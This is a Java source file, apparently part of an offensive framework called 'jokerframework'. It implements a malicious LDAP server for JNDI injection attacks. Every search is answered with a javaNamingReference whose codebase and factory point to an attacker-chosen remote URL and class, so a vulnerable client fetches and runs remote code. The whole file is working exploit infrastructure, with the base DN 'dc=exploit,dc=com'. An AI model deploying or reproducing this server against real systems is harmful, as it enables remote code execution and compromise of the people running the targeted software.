package com.lucifaer.jokerframework.server;

import com.lucifaer.jokerframework.core.context.ShellContext;
import com.lucifaer.jokerframework.core.server.JokerBaseServer;
import com.lucifaer.jokerframework.core.server.JokerServer;
import com.lucifaer.jokerframework.core.shell.ShellThrowableHandler;
import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.context.annotation.Scope;
import org.springframework.stereotype.Component;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.UnknownHostException;
import java.util.Map;

@Component(value = "ldap-server")
@Scope("prototype")
public class LdapServer extends JokerBaseServer implements JokerServer {
    @Autowired
    ShellThrowableHandler shellThrowableHandler;

    private InMemoryDirectoryServer ds;

    private static final String defaultUrl = "0.0.0.0";
    private static final String defaultPort = "1389";

    public LdapServer() {
        this.serverName = "ldap-server";
        this.serverUrl = defaultUrl;
        this.serverPort = defaultPort;
        this.expactedParams.put("remote_className", null);
        this.expactedParams.put("remote_FactoryLocation", null);
    }

    @Override
    public void createServer(ShellContext shellContext) {
        Map<String, String> shellParams = shellContext.getParams();
        String className = shellParams.get("remote_className");
        String factoryLocation = shellParams.get("remote_FactoryLocation");
        String codebase = factoryLocation + "/#" +  className;

        try {
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig("dc=exploit,dc=com");
            config.setListenerConfigs(new InMemoryListenerConfig("listen", InetAddress.getByName(this.serverUrl), Integer.parseInt(this.serverPort), ServerSocketFactory.getDefault(), SocketFactory.getDefault(), (SSLSocketFactory) SSLSocketFactory.getDefault()));
            config.addInMemoryOperationInterceptor(new LdapServer.OperationInterceptor(new URL(codebase)));
            this.ds = new InMemoryDirectoryServer(config);
            this.ds.startListening();
        } catch (LDAPException | UnknownHostException | MalformedURLException e) {
            shellThrowableHandler.handleThrowable(e);
        }

    }

    @Override
    public void stopServer() {
        this.ds.shutDown("listen", true);
    }

    private static class OperationInterceptor extends InMemoryOperationInterceptor {
        private URL codebase;

        public OperationInterceptor(URL cb) {
            this.codebase = cb;
        }

        @Override
        public void processSearchResult(InMemoryInterceptedSearchResult result) {
            String base = result.getRequest().getBaseDN();
            Entry e = new Entry(base);

            try {
                this.sendResult(result, base, e);
            } catch (Exception ex) {
                ex.printStackTrace();
            }
        }

        protected void sendResult(InMemoryInterceptedSearchResult result, String base, Entry e) {
            try {
                e.addAttribute("javaClassName", "foo");
                String cbstring = this.codebase.toString();
                int refPos = cbstring.indexOf(35);
                if (refPos > 0) {
                    cbstring = cbstring.substring(0, refPos);
                }

                e.addAttribute("javaCodeBase", cbstring);
                e.addAttribute("objectClass", "javaNamingReference");
                e.addAttribute("javaFactory", this.codebase.getRef());
                result.sendSearchEntry(e);
                result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
            } catch (LDAPException ex) {
                ex.printStackTrace();
            }

        }
    }
}
